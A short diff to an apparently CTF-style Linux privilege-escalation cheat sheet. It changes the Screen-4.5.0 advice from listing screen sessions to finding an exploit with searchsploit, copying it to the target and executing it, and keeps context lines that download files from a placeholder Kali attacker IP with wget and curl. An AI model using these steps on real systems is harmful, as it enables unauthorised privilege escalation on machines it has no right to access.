@@ -138,8 +138,15 @@ wget <http://<kali linux IP>/file_name>
 curl <http://<kali linux IP>/file_name> -o <file_name>
 ```
 
-- If you see **Screen-4.5.0** installed in the linux machine then you can use it to escalate the privileges
+- If you see **Screen-4.5.0** installed in the linux machine then try to search in google or in metasploitable for vulnerabilities or exploits
+available for that version
+- if you found any exploit available for screen-4.5.0 then you can use that to escalate the privileges
 ```bash
-screen -ls
-screen -r <session_id>
+searchsploit Screen-4.5.0
 ```
+- copy the exploit to the target machine and then give the permissions to execute
+```bash
+chmod +x <file_name>
+./<file_name>
+``` 
+
